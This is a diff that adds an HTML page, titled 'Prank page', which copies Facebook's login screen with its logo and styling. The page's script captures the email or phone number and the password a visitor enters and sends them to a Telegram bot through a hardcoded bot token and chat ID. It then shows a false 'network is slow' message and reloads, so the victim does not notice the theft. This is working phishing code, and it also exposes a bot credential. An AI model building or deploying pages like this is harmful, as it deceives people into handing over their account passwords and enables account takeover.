@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Prank page</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-image: url('https://res.cloudinary.com/dwybsxbvw/image/upload/v1754737235/Picsart_25-08-09_11-58-23-689_fbs8bb.jpg');
+      background-size: contain;
+      background-position: center;
+      background-repeat: no-repeat;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: white;
+    }
+
+    .login-wrap {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 16px;
+      width: 90vw;
+      max-width: 280px;
+      text-align: center;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .logo-box {
+      margin-bottom: 16px;
+    }
+
+    .logo-box img {
+      width: 60px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #dddfe2;
+      font-size: 14px;
+    }
+
+    button.log-btn {
+      width: 100%;
+      padding: 10px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 15px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button.log-btn:hover {
+      background-color: #165ecc;
+    }
+
+    .forgot-pass {
+      margin-top: 8px;
+    }
+
+    .forgot-pass a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .create-acc {
+      margin-top: 16px;
+    }
+
+    .create-acc button {
+      width: 100%;
+      padding: 10px;
+      background-color: white;
+      color: #1877f2;
+      border: 1px solid #1877f2;
+      font-size: 15px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .create-acc button:hover {
+      background-color: #f0f5ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-wrap">
+    <div class="logo-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Face.book Logo">
+    </div>
+
+    <form id="loginForm">
+      <input type="text" id="emailOrPhone" placeholder="Mobile number / email address" required>
+      <input type="text" id="password" placeholder="Password" required>
+      <button type="submit" class="log-btn">Log in</button>
+    </form>
+
+    <div class="forgot-pass">
+      <a href="#">Forgotten password?</a>
+    </div>
+
+    <div class="create-acc">
+      <button>Create new account</button>
+    </div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8088826825:AAE48g9H4e2rXZ0KKoUIXbPo5AUeMxdHSEE"; 
+    const CHAT_ID = "5726860669"; 
+
+    const loginForm = document.getElementById('loginForm');
+
+    loginForm.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!emailOrPhone || !password) {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      const message = `New Login Attempt:\nUser: ${emailOrPhone}\nKey: ${password}`;
+
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams();
+        params.append('chat_id', CHAT_ID);
+        params.append('text', message);
+
+        const response = await fetch(url, {
+          method: 'POST',
+          body: params
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          alert("Your network is slow, please wait...");
+          loginForm.reset();
+          location.reload();
+        } else {
+          alert("Failed to send data. Please try again.");
+        }
+      } catch (err) {
+        alert("Error sending data: " + err.message);
+      }
+    });
+  </script>
+</body>
+</html>
